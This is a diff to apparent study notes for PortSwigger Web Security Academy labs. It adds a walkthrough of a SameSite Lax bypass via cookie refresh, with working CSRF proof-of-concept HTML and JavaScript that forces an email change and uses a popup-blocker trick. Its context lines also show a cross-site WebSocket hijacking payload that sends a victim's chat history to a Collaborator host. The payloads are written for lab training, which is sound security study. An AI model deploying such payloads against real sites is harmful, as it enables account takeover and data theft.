@@ -1795,11 +1795,11 @@ email=wiener@normal-user.com
        ```
      - **URL encode the whole script**
      - **Recreate the URL-encoded CSWSH payload as the username parameter**   
-     ```
-     <script>
-          document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
-      </script>
-     ```
+        ```
+        <script>
+             document.location = "https://cms-YOUR-LAB-ID.web-security-academy.net/login?username=YOUR-URL-ENCODED-CSWSH-SCRIPT&password=anything";
+         </script>
+        ```
      - store and view the payload   
      - **Collaborator Poll now** > received a number of new interactions   
      - Go to latest GET /chat > confirm this request contain your session cookie   
@@ -1807,7 +1807,59 @@ email=wiener@normal-user.com
      - Deliver the exploit to the victim
      - Collaborator > Poll now
      - study the HTTP request to collaborator (Password inside of chat history)   
-- SameSite Lax bypass via cookie refresh   
+- SameSite Lax bypass via **cookie refresh**   
+  - study change email traffic and identify CSRF flaws      
+    - POST /my-account/change-email   
+      email=wiener2%40normal-user.net **(No CSRF token)**   
+    - Response of GET /oauth-callback?code=[...]   
+      Set-Cookie: session=XX; Expires=XXX; Secure; HttpOnly (**No SameSite attribute, browser use Lax restriction level**)   
+  - POST /my-account/change-email > **Generate PoC CSRF**   
+    ```
+      <script>
+          history.pushState('', '', '/')
+      </script>
+      <form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
+          <input type="hidden" name="email" value="foo@bar.com" />
+          <input type="submit" value="Submit request" />
+      </form>
+      <script>
+          document.forms[0].submit();
+      </script>
+    ```
+    - if less than 2 min > success
+    - if more than 2 min > attack fail
+  - Bypass the **SameSite restriction**:  window.open(social-login)   
+    - Pop up blocker prevents the forced cookie refresh > attack fail   
+      ```
+      <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+          <input type="hidden" name="email" value="pwned@web-security-academy.net">
+      </form>
+      <script>
+          window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+          setTimeout(changeEmail, 5000);
+      
+          function changeEmail(){
+              document.forms[0].submit();
+          }
+      </script>
+      ```
+  - Bypass the **popup blocker**: window.onclick
+    ```
+    <form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="pwned@portswigger.net">
+      </form>
+      <p>Click anywhere on the page</p>
+      <script>
+          window.onclick = () => {
+              window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
+              setTimeout(changeEmail, 5000);
+          }
+      
+          function changeEmail() {
+              document.forms[0].submit();
+          }
+      </script>
+    ```
 - CSRF where Referer validation depends on header being present   
 - CSRF with broken Referer validation   
 
